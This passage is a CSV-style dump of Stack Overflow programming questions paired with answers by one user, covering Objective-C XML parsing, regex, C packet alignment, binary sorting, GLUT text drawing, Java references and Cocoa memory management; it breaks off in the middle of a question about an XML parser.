<pre><code>&lt;?xml version=""1.0"" encoding=""utf-8""?&gt;
&lt;FundInfo xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance"" xmlns:xsd=""http://www.w3.org/2001/XMLSchema"" xmlns=""http://tempuri.org/webservices""&gt;
  &lt;FundsReleaseDate&gt;2009-02-11T00:00:00&lt;/FundsReleaseDate&gt;
  &lt;FundValue&gt;7800&lt;/FundValue&gt;
  &lt;FundShares&gt;1000&lt;/FundShares&gt;
&lt;/FundInfo&gt;
</code></pre>

<p>I'm trying to get 7800, i.e FundValue. Can someone point me in the correct direction, I am using the TouchXml CXMLDocument and myParser is of type CXMLDocument, I have tried</p>

<pre><code>NSArray *nodes = [myParser nodesForXPath:@""//FundInfo"" error:&amp;err];
</code></pre>

<p>Basically nodes evaluates to nil </p>

<pre><code>if ([nodes count] &gt; 0 ) {
    amount = [nodes objectAtIndex:1];
}
</code></pre>

<p>UPDATE 1: I have abandoned parsing using XPath, and have replaced it with NSURLRequest, so now I have the entire XML in a string, but my rude introduction to objective-C continues...I just realized how spoiled I have become  to the .NET BCL where things like Regex are so easily available. </p>

<p>UPDATE2: I've figured out how to use RegexKitLite for regex. </p>

<p>So the question now is, how do I get the ""7800"" from inside FundValue which is now one big string. I have confirmed I have it in my NSString by writing it using NSLog.</p>
","9530","Adam Rosenfield","<p>Try</p>

<pre><code>NSArray *nodes = [myParser nodesForXPath:@""/FundInfo/*"" error:&amp;err];
</code></pre>
"
"<p>I have a field on a form that takes the following values: -1, 2-10, 99</p>

<p>I have a business rule that's concerned with answers 2-10.</p>

<p>I'm trying to write a regular expression that will match 2-10 but <em>not</em> 99, and I'm having trouble.</p>

<p>The original expression:</p>

<pre><code>^2|3|4|5|6|7|8|9|10$
</code></pre>

<p>Fails because 99 is matched (technically, twice).  Also, the Line boundries are something I've never been comfortable with.  I oberve different behavior from them in expresso than I do in other places (e.g. .net).  In this particular instance, the regex is being run in <strong>javascript</strong>.  Anyway, expresso seems to ignore them (and if I put the values in brackets: </p>

<pre><code>^[2|3|4|5|6|7|8|9|10]$

^[2-9]$
</code></pre>

<p>either ""all spelled out"" or as a range, expresso never returns any matches if I specify the opening line/string closing line/string characters (and yes, I was trying to match the 10 separately in the second case there).</p>

<p>I know, I know.  If you use a regex to solve a problem, then you have two problems (and presumably they'll start inviting friends over, thing 1 and thing 2 style).  I don't <strong>have</strong> to use one here; I may switch to a case statement. But it seems like I should be able to use a regex here, and it seems a reasonable thing to do.  I'm still pretty green when it comes to the regex; </p>
","9530","Adam Rosenfield","<p>Use parentheses around the alternations, since concatenation has higher precedence than alternation:</p>

<pre><code>^(2|3|4|5|6|7|8|9|10)$
</code></pre>
"
"<p>I'm writing a program in C for Linux on an ARM9 processor.  The program is to access network packets which include a sequence of tagged data like:</p>

<pre><code>&lt;fieldID&gt;&lt;length&gt;&lt;data&gt;&lt;fieldID&gt;&lt;length&gt;&lt;data&gt; ...
</code></pre>

<p>The fieldID and length fields are both uint16_t.  The data can be 1 or more bytes (up to 64k if the full length was used, but it's not).</p>

<p>As long as <code>&lt;data&gt;</code> has an even number of bytes, I don't see a problem.  But if I have a 1- or 3- or 5-byte <code>&lt;data&gt;</code> section then the next 16-bit fieldID ends up not on a 16-bit boundary and I anticipate alignment issues.  It's been a while since I've done any thing like this from scratch so I'm a little unsure of the details.  Any feedback welcome.  Thanks.</p>
","9530","Adam Rosenfield","<p>The easy way is to manually rebuild the <code>uint16_t</code>s, at the expense of speed:</p>

<pre><code>uint8_t *packet = ...;
uint16_t fieldID = (packet[0] &lt;&lt; 8) | packet[1];  // assumes big-endian host order
uint16_t length = (packet[2] &lt;&lt; 8) | packet[2];
uint8_t *data = packet + 4;
packet += 4 + length;
</code></pre>

<p>If your processor supports it, you can type-pun or use a union (but beware of <a href=""http://cellperformance.beyond3d.com/articles/2006/06/understanding-strict-aliasing.html"" rel=""nofollow""><em>strict aliasing</em></a>).</p>

<pre><code>uint16_t fieldID = htons(*(uint16_t *)packet);
uint16_t length = htons(*(uint16_t *)(packet + 2));
</code></pre>

<p>Note that unaligned access aren't always supported (e.g. they might generate a fault of some sort), and on other architectures, they're supported, but there's a performance penalty.</p>

<p>If the packet isn't aligned, you could always copy it into a static buffer and then read it:</p>

<pre><code>static char static_buffer[65540];
memcpy(static_buffer, packet, packet_size);  // make sure packet_size &lt;= 65540
uint16_t fieldId = htons(*(uint16_t *)static_buffer);
uint16_t length = htons(*(uint16_t *)(static_buffer + 2));
</code></pre>

<p>Personally, I'd just go for option #1, since it'll be the most portable.</p>
"
"<p>As the title says, I need to write a small program to read data from standard input, sort it, and send it to standard output. The program should take 1 argument that tells it how long is one record (in bytes). Here's how I test it:</p>

<pre><code>printf 'D\x00C\x00\x00B\x00A' | ./binsort 2 | od -c
</code></pre>

<p>The above should output something like:</p>

<pre><code>0000000  \0   A  \0   B   C  \0   D  \0
0000010
</code></pre>

<p>Here's what I have so far (<code>binsort.c</code>):</p>

<pre><code>#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;limits.h&gt;

using namespace std;


void print_usage()
{
        printf(""%s\n"", ""Usage: "");
}


int compare (const void * a, const void * b) // the compare function for qsort... might need some work
{
  return ( *(int*)a - *(int*)b );
}


int main(int argc, char *argv[])
{
        if (argc != 2 || stdin == NULL) // check for argument and piped input
        {
                print_usage();
                exit(EXIT_FAILURE);
        }

        int entry_size = atoi(argv[1]);

        if (entry_size &lt;= 0 || entry_size &gt;= INT_MAX) // check for valid range of entry size
        {
                print_usage();
                exit(EXIT_FAILURE);
        }

        char *input = new char[entry_size]; // to hold single record

        while (fgets(input, entry_size, stdin) != NULL)
        {
                printf(""%s"", input); // output single record we just read
        }

        exit(EXIT_SUCCESS);
}
</code></pre>

<p>Then compile with <code>g++ binsort.c -o binsort</code>.</p>

<p>The above compiles but doesn't output the data that <code>printf</code> sent to it. It should output it in 2-byte chunks... like <code>D\0 C\0 \0B \0A</code>... but it doesn't.</p>

<p>I'm thinking of using <code>qsort</code> to do the sorting on a <code>malloc/realloc</code>-allocated array. However, I never had experience with these, in effect banging my head on this little utility for a few days. Anyone can help?</p>

<p><em>P.S. People asked if this is a homework assignment... It's not - developers at my company want to use this to debug output of their project.</em></p>
","9530","Adam Rosenfield","<p>Don't use <code>scanf()</code> and <code>printf()</code>.  Those are supposed to be used with text data.  Since you're dealing with binary data, you instead want to use the lower-level <code>fread()</code> and <code>fwrite()</code> functions.  Since you don't know how much total data there is, you'll have to use a dynamic data structure (such as a resizeable array) to store the input.  You can't process the data on-line -- you have to read it all in, sort it, then write it back out.  Your sort function is also wrong -- you're only comparing the first 4 bytes of each record, which is wrong if the record size is anything other than 4 bytes.  Use <code>memcmp()</code> instead.</p>

<p>This should work:</p>

<pre><code>char *input = NULL;
size_t input_size = 0;
int num_items = 0;
int entry_size;

int compare_func(const void *e1, const void *e2)
{
  return memcmp(e1, e2, entry_size);
}

int main(int argc, char **argv)
{
   // ...
  char *datum = malloc(entry_size);  // check for NULL
  input_size = 4096;
  input = malloc(input_size);  // check for NULL

  while(1)
  {
    if(fread(datum, 1, entry_size, stdin) &lt; entry_size)
      break;
    size_t new_size = (num_items + 1) * entry_size;
    if(new_size &gt; input_size)
    {
      input = realloc(input, input_size * 2);  // check for NULL
      input_size *= 2;
    }
    memcpy(input + num_items * entry_size, datum, entry_size);
    num_items++;
  }

  qsort(input, num_items, entry_size, compare_func);

  fwrite(input, entry_size, num_items, stdout);

  return 0;
}
</code></pre>
"
"<p>For my Programming 102 class we are asked to deliver C code that compiles and runs under Linux. I don't have enough spare space on my hard drive to install Linux alongside Windows, and so I use cygwin to compile my programs.</p>

<p>The most recent program I had to give in compiles and runs fine under cygwin. It compiles fine under Linux, but half-way through execution produces a segmentation fault. I explained this to the grad student who gives us class and he said that cygwin's version of GCC allows for sloppier code to be compiled and executed.</p>

<p>The few references I have found via google haven't been conclusive. One thread I found said that the cause for the seg fault under Linux is a memory leak. Why would this not affect the cygwin version?</p>

<p>I would use the University's computers, but I can't use Subversion on them which would significantly hinder my efforts. (I'm new to coding and often need to be able to be able to revert to X revisions ago).</p>

<p>Is cygwin's version of GCC really more 'lax' with the code it compiles? If so, are there any obvious issues to look out for when coding? Are there any alternatives for being able to write code that will run under Linux?</p>

<p><strong>Edit</strong></p>

<p>Thanks for the replies. I wasn't explicit enough in my original post: that there is a bug in my code was pretty much a given for me (I am quite new to programming, and really green when it comes to C, after all). My TA implied cygwin's GCC is a less reliable compiler -allowing for much sloppier code to run- than the one found under GNU/Linux. I found this strange and so had a search on the internet, but couldn't really find any references to that fact.</p>

<p>More than blaming the compiler vs. my code, I was wondering what the reason could be for the program to run under Windows and crash under Linux. The replies re: different memory managers and heap/stack layout under Windows/Linux were illustrating in that regard.</p>

<p>Would the conclusion that cygwin's GCC is just as 'good' as GNU/Linux', and it's the underlying operating systems/sheer luck that my buggy program runs under one and not the other be pretty much correct?</p>

<p>Regarding posting the source code, it's a homework assignment so I'd prefer to find the issue myself if at all possible :)</p>

<p><strong>Edit 2</strong></p>

<p>I've accepted jalf's answer as it talks about what makes the program run under Windows and not under Linux, which was what I really wanted to know. Thanks to everyone else who contributed, they were all very interesting and informative replies.</p>

<p>When I've found the issue and fixed it I'll upload a zip file with all the source code of this non-working version, in case anyone is curious to see what the hell I did :)</p>

<p><strong>Edit 3</strong></p>

<p>For those interested in seeing the code, I found the problem, and it was indeed due to pointers. I was trying to return a pointer from a function. The pointer I was trying to return was being declared inside the function and so was being destroyed once the function executed. Problematic code is commented out on lines 22-24.</p>

<p>Feel free to ridicule my code.</p>

<pre><code>/**
*  Returns array of valid searches based on current coordinate
*/
void determine_searches(int row, int col, int last_row, int last_col, int *active_search){
    // define coordinate categories and related valid search directions
    int Library0[] = {2, 3, 4, -1};
    int Library1[] = {4, 5, 6, -1};
    int Library2[] = {2, 3, 4, 5, 6, -1};
    int Library3[] = {0, 1, 2, 3, 4, 5, 6, 7, -1};
    int Library4[] = {0, 1, 2, -1};
    int Library5[] = {0, 6, 7, -1};
    int Library6[] = {0, 1, 2, 6, 7, -1};
    int Library7[] = {0, 1, 2, 3, 4, -1};
    int Library8[] = {0, 4, 5, 6, 7, -1};

    int * Library[] = { 
        Library0, Library1, Library2,
        Library3, Library4, Library5,
        Library6, Library7, Library8,
    };

    // declare (and assign memory to) the array of valid search directions that will be returned
    //int *active_search;
    //active_search = (int *) malloc(SEARCH_DIRECTIONS * sizeof(int));


    // determine which is the correct array of search directions based on the current coordinate
    // top left corner
    	int i = 0;
    if(row == 0 &amp;&amp; col == 0){
    	while(Library[0][i] != -1){
    		active_search[i] = Library[0][i];
    		i++;
    	}
    }
    // top right corner
    else if(row == 0 &amp;&amp; col == last_col){
    	while(Library[1][i] != -1){
    		active_search[i] = Library[1][i];
    		i++;
    	}
    }
    // non-edge columns of first row
    else if(row == 0 &amp;&amp; (col != 0 || col != last_col)){
    	while(Library[2][i] != -1){
    		active_search[i] = Library[2][i];
    		i++;
    	}
    }
    // non-edge coordinates (no edge columns nor rows)
    else if(row != 0 &amp;&amp; row != last_row &amp;&amp; col != 0 &amp;&amp; col != last_col){
    	while(Library[3][i] != -1){
    		active_search[i] = Library[3][i];
    		i++;
    	}
    }
    // bottom left corner
    else if(row == last_row &amp;&amp; col == 0){
    	while(Library[4][i] != -1){
    		active_search[i] = Library[4][i];
    		i++;
    	}
    }
    // bottom right corner
    else if(row == last_row &amp;&amp; col == last_col){
    	while(Library[5][i] != -1){
    		active_search[i] = Library[5][i];
    		i++;
    	}
    }
    // non-edge columns of last row
    else if(row == last_row &amp;&amp; (col != 0 || col != last_col)){
    	while(Library[6][i] != -1){
    		active_search[i] = Library[6][i];
    		i++;
    	}
    }
    // non-edge rows of first column
    else if((row != 0 || row != last_row) &amp;&amp; col == 0){
    	while(Library[7][i] != -1){
    		active_search[i] = Library[7][i];
    		i++;
    	}
    }
    // non-edge rows of last column
    else if((row != 0 || row != last_row) &amp;&amp; col == last_col){
    	while(Library[8][i] != -1){
    		active_search[i] = Library[8][i];
    		i++;
    	}
    }
    active_search[i] = -1;
}
</code></pre>
","9530","Adam Rosenfield","<p>You definitely have a bug somewhere in your code.  It's possible that the Windows memory manager is being more lax than the Linux memory manager.  On Windows, you might be doing bad things with memory (like overwriting array bounds, memory leaks, double-free'ing, etc.), but it's letting you get away with it.  A famous story related to this can be found at <a href=""http://www.joelonsoftware.com/articles/APIWar.html"" rel=""nofollow"">http://www.joelonsoftware.com/articles/APIWar.html</a> (search for ""SimCity"" on that (somewhat lengthy) article).</p>
"
"<p>Is there any way to override the line numbers in Java (e.g., by using some kind of preprocessor directive)?</p>

<p>I am ""compiling"" a high-level language, down to Java byte code using Janino.  I need compiler errors to report the line from the original file, not the generated Java code.</p>

<p>C# has the #line directive, and I've successfully exploited it to map line numbers from a source file to the compiled result.  I need the same for Java.</p>

<p>Thanks!</p>
","9530","Adam Rosenfield","<p>Unfortunately, no, there isn't an equivalent <code>#line</code> directive in Java.  The best you can do is modify the source after it's been generated by deleting/inserting newlines to match the real source (or modify the code generator).  Or, you could modify the line numbers stored in the binary class files after they've been compiled, but that will likely be even more painful.</p>
"
"<p>It's meant to return an <code>OSType</code>, but instead I'm just getting -50. Does anyone have any idea what error this represents? I can't find it anywhere.</p>

<p>A code snippet for context (the error is so ambiguous I don't know what snippet to paste, here's pretty much everything):</p>

<pre><code>ExtAudioFileRef cafFile;
AudioStreamBasicDescription cafDesc;

cafDesc.mBitsPerChannel = 16;
cafDesc.mBytesPerFrame = 4;
cafDesc.mBytesPerPacket = 4;
cafDesc.mChannelsPerFrame = 2;
cafDesc.mFormatFlags = 0;
cafDesc.mFormatID = 'ima4';
cafDesc.mFramesPerPacket = 1;
cafDesc.mReserved = 0;
cafDesc.mSampleRate = 44100;

OSType status = ExtAudioFileCreateWithURL(
                   fileURL,                    // inURL
                   'caff',                     // inFileType
                   &amp;cafDesc,                   // inStreamDesc
                   NULL,                       // inChannelLayout
                   kAudioFileFlags_EraseFile,  // inFlags
                   &amp;cafFile                    // outExtAudioFile
                   );    // returns 0xFFFFFFCE
</code></pre>
","9530","Adam Rosenfield","<p><a href=""http://developer.apple.com/iphone/library/documentation/MusicAudio/Reference/ExtendedAudioFileServicesReference/Reference/reference.html#//apple_ref/c/func/ExtAudioFileCreateWithURL"" rel=""nofollow""><code>ExtAudioFileCreateWithURL()</code></a> returns an <code>OSStatus</code>, not an <code>OSType</code>.  See the file <code>MacErrors.h</code> for the various error codes.  In this case, -50 is <code>paramErr</code> (error in user parameter list), so you're passing one or more of the parameters incorrectly to the function.</p>
"
"<p>I'm trying to encapsulate some functions from the C socket library into my own C++ class.  I'd like to define a member function that uses the same name as its corresponding C function, but with a different signature.  For example, I'd like to write the function</p>

<pre><code>ssize_t MyClass::write(const void *buf);
</code></pre>

<p>which makes a call to</p>

<pre><code>ssize_t write(int fd, const void *buf, size_t count);
</code></pre>

<p>When I compile I get the following errors</p>

<pre><code>error: no matching function for call to ‘MyClass::write(int&amp;, const char*&amp;, size_t)’
note: candidates are: ssize_t MyClass::write(const char*)
</code></pre>

<p>I have the correct <code>#include</code> statements to make the call to the C socket library, but my definition of a write function seems to be shadowing it.  If I change the name of my class defined function to something else, everything seems to work fine.</p>

<p>I'm reasonably sure that changing my function name is going to be my final solution, but could someone tell me the name of the C++ naming rule that causes this behavior?  I'd like to read up on it so I know what I'm doing in the future.</p>
","9530","Adam Rosenfield","<p><a href=""http://msdn.microsoft.com/en-us/library/2902y0f8(VS.80).aspx"" rel=""nofollow"">This page</a> does a pretty good job of describing the name lookup rules in C++.  Basically, once the compiler sees that <code>write()</code> is a class member function, it doesn't look for global functions of the same name.  It then reports an error since the member function <code>write()</code> doesn't have the right number and types of arguments as what you gave it.  The use of the unary scope resolution operator <code>::</code> forces the compiler to only search the global namespace for functions named <code>write()</code>, which then succeeds.</p>
"
"<p>From time to time, I need to compare files binarily, but is there any open source tool that can do this?</p>

<p><a href=""http://www.ultraedit.com/products/ultracompare.html"" rel=""nofollow"">UltraCompare</a> can, but it's a commercial product. </p>
","9530","Adam Rosenfield","<p>GNU <a href=""http://www.gnu.org/software/diffutils/"" rel=""nofollow"">diffutils</a> comes with a program called <code>cmp</code> that will tell you the first offset at which two binary files differ.  Unfortunately, it does little more than that.</p>

<p>Alternatively, you could hexdump each file and pipe it into your favorite text diff tool:</p>

<pre><code>diff &lt;(hexdump -v -e '1/1 ""%02x\n""' binfile1) &lt;(hexdump -v '1/1 ""%02x\n""' binfile2)
</code></pre>
"
"<p>I'm a game programmer working in Korea.<br>
I started Stackoverflow recently and I found it helps me a lot.<br>
Also I think communicating with other developers is a good way to learning and improving myself.<br>
Stackoverflow is the only site I know to communicate (especially in English).<br>
<br>Any other nice place to communicate(ask/answer/talk) with game developers(or C++ programmers, network programmers)?</p>
","9530","Adam Rosenfield","<p><a href=""http://www.gamedev.net"" rel=""nofollow"">Gamedev.net</a> has a great community of game developers, along with tons of great articles and resources related to game programming.</p>
"
"<p>I am creating my very first iphone app and need help here. My programming background is not C and I am bit lost. </p>

<p>Basically what I want my application to do is to display random bitmaps and let user touch individual bitmap and validate them. The method I used to display the bitmaps is NSTimer with UIImage for the actual bitmaps. So far, it was working fine in displaying the bitmap. But I am stuck on the next step, which is registering the touched bitmaps. I tried to use tag on the bitmap then touchesBegan function. I got a runtime error everytime I touched screen (I think.)</p>

<p>My questions are:
1. Given my requirement, is the method I am using is a good method, or even technically possible?
2. If q#1 answer is no, do you have alternative solution?</p>

<p>Thanks and I appreciate your help!</p>

<p>Regards,
Eric</p>
","9530","Adam Rosenfield","<p>If you're getting an exception inside your <code>touchesBegan:</code> function, then your code there has a bug in it.  If you run your app with the debugger, it should tell you on exactly what line of code the problem is occurring.  If I had to guess, I would say that you're trying to send a message to an object which doesn't handle that message, which throws an exception.</p>

<p>Make sure your code is compiling without any warnings -- it's possible you have a typo in a function name somewhere.  If you misspell the message name, it will still compile correctly, but it will throw an exception at runtime when you try to send that message.</p>
"
"<p>How do I draw a text string onto the screen using GLUT / OpenGL drawing functions?</p>
","9530","Adam Rosenfield","<p>If you don't like the built-in stroke font or bitmap font that comes with GLUT as per <a href=""http://stackoverflow.com/questions/538661/how-do-i-draw-text-with-glut-opengl-in-c/538691#538691"">epatel's answer</a>, you'll have to roll your own solution.</p>

<p><a href=""http://nehe.gamedev.net"">NeHe</a> has some good tutorials (along with fully-working sample code) on this:</p>

<ul>
<li><a href=""http://nehe.gamedev.net/data/lessons/lesson.asp?lesson=13"">Lesson 13 - Bitmap Fonts</a></li>
<li><a href=""http://nehe.gamedev.net/data/lessons/lesson.asp?lesson=14"">Lesson 14 - Outline Fonts</a></li>
<li><a href=""http://nehe.gamedev.net/data/lessons/lesson.asp?lesson=15"">Lesson 15 - Texture-Mapped Outline Fonts</a></li>
</ul>
"
"<p>The short version is: How do I learn the size (in bits) of an individual field of a c++ field?</p>

<p>To clarify, an example of the field I am talking about:</p>

<pre><code>struct Test {
    unsigned field1 : 4;  // takes up 4 bits
    unsigned field2 : 8;  // 8 bits
    unsigned field3 : 1;  // 1 bit
    unsigned field4 : 3;  // 3 bits
    unsigned field5 : 16; // 16 more to make it a 32 bit struct

    int normal_member; // normal struct variable member, 4 bytes on my system
};

Test t;
t.field1 = 1;
t.field2 = 5;
// etc.
</code></pre>

<p>To get the size of the entire Test object is easy, we just say</p>

<pre><code>sizeof(Test); // returns 8, for 8 bytes total size
</code></pre>

<p>We can get a normal struct member through</p>

<pre><code>sizeof(((Test*)0)-&gt;normal_member); // returns 4 (on my system)
</code></pre>

<p>I would like to know how to get the size of an individual field, say Test::field4. The above example for a normal struct member does not work. Any ideas? Or does someone know a reason why it cannot work? I am fairly convinced that sizeof will not be of help since it only returns size in bytes, but if anyone knows otherwise I'm all ears.</p>

<p>Thanks!</p>
","9530","Adam Rosenfield","<p>I don't think you can do it.  If you <em>really</em> need the size, I suggest you use a <code>#define</code> (or, better yet, if possible a <code>const</code> variable -- I'm not sure if that's legal) as so:</p>

<pre><code>#define TEST_FIELD1_SIZE 4
struct Test {
    unsigned field1 : TEST_FIELD1_SIZE;
    ...
}
</code></pre>
"
"<p>Breadth-first list is important, here. Also, limiting the depth searched would be nice.</p>

<pre><code>$ find . -type d
/foo
/foo/subfoo
/foo/subfoo/subsub
/foo/subfoo/subsub/subsubsub
/bar
/bar/subbar

$ find . -type d -depth
/foo/subfoo/subsub/subsubsub
/foo/subfoo/subsub
/foo/subfoo
/foo
/bar/subbar
/bar

$ &lt; what goes here? &gt;
/foo
/bar
/foo/subfoo
/bar/subbar
/foo/subfoo/subsub
/foo/subfoo/subsub/subsubsub
</code></pre>

<p>I'd like to do this using a bash one-liner, if possible. If there were a javascript-shell, I'd imagine something like</p>

<pre><code>bash(""find . -type d"").sort( function (x) x.findall(/\//g).length; )
</code></pre>
","9530","Adam Rosenfield","<p>I don't think you could do it using built-in utilities, since when traversing a directory hierarchy you almost always want a depth-first search, either top-down or bottom-up.  Here's a Python script that will give you a breadth-first search:</p>

<pre><code>import os, sys

rootdir = sys.argv[1]
queue = [rootdir]

while queue:
    file = queue.pop(0)
    print(file)
    if os.path.isdir(file):
        queue.extend(os.path.join(file,x) for x in os.listdir(file))
</code></pre>

<p><strong>Edit:</strong></p>

<ol>
<li>Using <code>os.path</code>-module instead of <code>os.stat</code>-function and <code>stat</code>-module.</li>
<li>Using <code>list.pop</code> and <code>list.extend</code> instead of <code>del</code> and <code>+=</code> operators.</li>
</ol>
"
"<p>Given: Class has no fields, every variable is local. littleString was created by refactoring bigString in Eclipse:</p>

<pre><code>public String bigString()
    {
        StringBuffer bob = new StringBuffer();
        this.littleString(bob);
        return bob.toString();
    }

private void littleString(final StringBuffer bob)
    {
        bob.append(""Hello, I'm Bob"");
    }
</code></pre>

<p>The method littleString should not be passing the StringBuffer back, but yet is is. What kind of Black Magic goes on here? This is breaking all rules of encapsulation that I know. I'm in shock, words fail me.</p>
","9530","Adam Rosenfield","<p><code>littleString</code> isn't passing the object back -- it's just using the same object.  Both the local variable <code>bob</code> in <code>bigString()</code> and the parameter <code>bob</code> in <code>littleString()</code> refer to the same object, so if you change one of those objects, the changes will appear instantaneously in the other <em>because they're both references to the same object</em>.</p>

<p>The issue is that <code>StringBuffer</code>s are mutable and have internal state associated with them.  Some types of objects (such as <code>String</code>s) are immutable, so you can safely pass them around as method parameters, and you know they won't ever get modified.  Note that the addition of the <code>final</code> keyword doesn't help here -- it just makes sure that <code>bob</code> never gets assigned to refer to a different <code>StringBuffer</code> object.</p>
"
"<p>How can I automatically replace all C style comments (/* comment */) by C++ style comments (// comment)? This has to be done automatically in several files. Any solution is ok, as long as it works.</p>
","9530","Adam Rosenfield","<p>Here's a Python script that will (mostly) do the job.  It handles most edge cases, but it does not handle comment characters inside of strings, although that should be easy to fix.</p>

<pre><code>#!/usr/bin/python

import sys

out = ''
in_comment = False

file = open(sys.argv[1], 'r+')
for line in file:
    if in_comment:
        end = line.find('*/')
        if end != -1:
            out += '//' + line[:end] + '\n'
            out += ' ' * (end + 2) + line[end+2:]
            in_comment = False
        else:
            out += '//' + line
    else:
        start = line.find('/*')
        cpp_start = line.find('//')
        if start != -1 and (cpp_start == -1 or cpp_start &gt; start):
            out += line[:start] + '//' + line[start+2:]
            in_comment = True
        else:
            out += line

file.seek(0)
file.write(out)
</code></pre>
"
"<p>I have <a href=""http://stackoverflow.com/questions/539661/server-side-includes-and-character-encoding"">a problem</a> with character encoding in some HTML pages. It seems that the cause of the problem is that some of the .html files are not saved as UTF-8 encoded files. Even though I have instructed Eclipse to save these files as UTF-8, when I open them in a browser, it indicates that the files are ISO-8859-1.</p>

<p>How can I change the encoding of these files to UTF-8?</p>

<p><strong>UPDATE:</strong> I already have the following included in the  section of each webpage</p>

<pre><code>&lt;meta http-equiv=""Content-Type"" content=""text/html; charset=UTF-8"" /&gt;
</code></pre>

<p>I am using the Apache web server.</p>

<p>Thanks,
Donal</p>
","9530","Adam Rosenfield","<p>You can use <a href=""http://www.gnu.org/software/libiconv/"" rel=""nofollow"">iconv</a> to convert files from one character encoding to another.</p>
"
"<p>Is it possible to change the styling of iPhone native buttons? For example, I'd like to use a smaller font size for part of the button text, and larger for another - something like</p>

<pre><code>&lt;small&gt;pick a&lt;/small&gt;&lt;big&gt;color&lt;/big&gt;
</code></pre>

<p>I'd also like to use buttons that form a right-arrow shape instead of being rectangular. Something like:</p>

<pre><code>---------------------------------
\ Color  \   Size    \    Shape  \
/        /           /           /
----------------------------------
</code></pre>

<p>Any of that possible?</p>
","9530","Adam Rosenfield","<p>I don't think you can do it easily.  You'll probably have to subclass <a href=""https://developer.apple.com/iphone/library/documentation/UIKit/Reference/UISegmentedControl_Class/Reference/UISegmentedControl.html"" rel=""nofollow""><code>UISegmentedControl</code></a> and override a bunch of methods.  To get differently sized fonts on the button text, you'll have to create several <code>UILabel</code>s as subviews and give each one the appropriate text and font size, and then lay them out.  To get the right-arrow shape, you'll need to override the <code>drawRect:</code> method to draw the control's background.</p>
"
"<p>I'm attempting to draw text to the screen using GLUT in 2d.</p>

<p>I want to use glutBitmapString(), can someone show me a simple example of what you have to do to setup and properly use this method in C++ so I can draw an arbitrary string at an (X,Y) position?</p>

<pre><code>glutBitmapString(void *font, const unsigned char *string);
</code></pre>

<p>I'm using linux, and I know I need to create a Font object, although I'm not sure exactly how and I can supply it with the string as the second arguement.  However, how do I also specify the x/y position?</p>

<p>A quick example of this would help me greatly.  If you can show me from creating the font, to calling the method that would be best.</p>
","9530","Adam Rosenfield","<p>You have to use <a href=""http://linux.die.net/man/3/glrasterpos""><code>glRasterPos</code></a> to set the raster position before calling <code>glutBitmapString()</code>.  Note that each call to <code>glutBitmapString()</code> advances the raster position, so several consecutive calls will print out the strings one after another.  You can also set the text color by using <a href=""http://linux.die.net/man/3/glcolor""><code>glColor()</code></a>.  The set of available fonts are listed <a href=""http://www.opengl.org/resources/libraries/glut/spec3/node76.html#SECTION000111000000000000000"">here</a>.</p>

<pre><code>// Draw blue text at screen coordinates (100, 120), where (0, 0) is the top-left of the
// screen in an 18-point Helvetica font
glRasterPos2i(100, 120);
glColor4f(0.0f, 0.0f, 1.0f, 1.0f);
glutBitmapString(GLUT_BITMAP_HELVETICA_18, ""text to render"");
</code></pre>
"
"<p>I know the basic principles about memory management (retain count, autorelease pools etc) in Cocoa, but once you go past simple retain/release, it's getting a bit more confusing. I couldn't find decent answers for those, as most tutorials cover simple scenarios. I would like to ask about best practices in how to write the code and avoid leaks.</p>

<p><hr /></p>

<p>1st question - iterations and temporary assigments:</p>

<pre><code>for (id object in objectArray) {    
     Model *currentItem = object;
    /* do something with currentItem */
    [currentItem release];
}
</code></pre>

<p>If I remove the release in last line the code will work fine, but there's leak.
What's the rule here? The object is already there in objectArray. I'm assigning it directly, to get the type. Should I do this some other way? Is this assignment increasing retainCount of currentItem? (is it something like [[alloc] initWithObject] ?) How to know if this assignment (object) is autoreleased or not?</p>

<p><hr /></p>

<p>2nd question - instant retains :</p>

<pre><code>Model *model = [unarchiver decodeObjectForKey:@""ARCHIVED_MODEL_OBJECT""];
// it has to be here, because (I was told) unarchiver will return autorelease object    
[model retain]; 
label.text = model.data;
</code></pre>

<p>How someone knew that this particular method works so weird, that I need to instantly call retain on returned value, or I will bump into null on next assignment? I couldn't find anything like this in documentation. According to retain/release rules, I would expect that decodeObjectForKey returns autorelased object, but it will take some time until the control goes back to app and pool claims the model object to be released. Is there any rule for that? How should I search for those?</p>

<p><hr /></p>

<p>3rd question - autoreleasing and passing variables:</p>

<pre><code>- (IBAction) loadXMLButtonClicked:(id) sender {
    objectArray = [self loadData]; // 1 - objectArray is instance var
    NSArray *objectArray = [self loadData]; // 2 - objectArray is local var

    // loadXMLButtonClicked is called on button click, here the method finishes
    // and control goes back to application, autorelease pool is cleaned?

    // case 1 - objectArray stays retained in instance variable? (because setter was used)
    // case 2 - objectArray is soon to be released, there were no retains? 
    // (ignore the fact that it's local var, just hypothetically)

}

- (NSArray *) loadData {
    NSArray *objectArray = [[NSArray alloc] init];
    // populate array here
    return [objectArray autorelease];
}
</code></pre>

<p><hr /></p>

<p>4th question - (bear with me, last one) parser xml best practice :
(i don't want to use other solutions, using standard parser is to practive objective-c memory management and flow)</p>

<p>Basically this code here works, works good and have no leaks, but I don't really know if this is proper approach. I have separate object that acts as parser, parses an XML to collect an array of objects of type Model. Now, after parsing done, externally I would like to obtain that array, though I don't know how (is copying the array and releasing whole parser good idea?). Please run through the code and see the comments.</p>

<p>I've debug this code many times, using gdb for printing retainCounts, zombies, etc. and while I can manage to get this running and without leaks, I don't know 100% why and would like to hear a good reasoning how should this be done with explanation. That would be much appreciated.</p>

<p>Controller.m</p>

<pre><code>- (NSArray *) loadData {
(...)
NSXMLParser *parser = [[NSXMLParser alloc] initWithData:data];
ModelXMLParser *parserDelegate = [[ModelXMLParser alloc] init];
[parser setDelegate:parserDelegate];
[parser parse];

objectArray = [[parserDelegate objectArray] copy]; 
// is this ok? i don't need the parser object so I think i should get rid of it
// and copy the data. how this copy works, is it shallow (only new reference to array)
// or deep copy (objects allocated again as well)?
// how to do deep copy of NSArray?

[parserDelegate release];
[parser release];
}
</code></pre>

<p>ModelXMLParser.m
(simplified)</p>

<pre><code>@implementation ModelXMLParser

@synthesize objectArray; // array of objects
@synthesize currentObject; // temporary object
@synthesize currentChars; // temporary chars
@synthesize parseChars; // parse chars only when there's need, leave those /t/n etc

- parser didStartElement (...) {
    if ([elementName isEqualToString:@""objects""]) {
        objectArray = [[NSMutableArray alloc] init];
    }
    else if ([elementName isEqualToString:@""object""]) {
        currentObject = [[Model alloc] init];
    }
    else if ([elementName isEqualToString:@""name""]) {
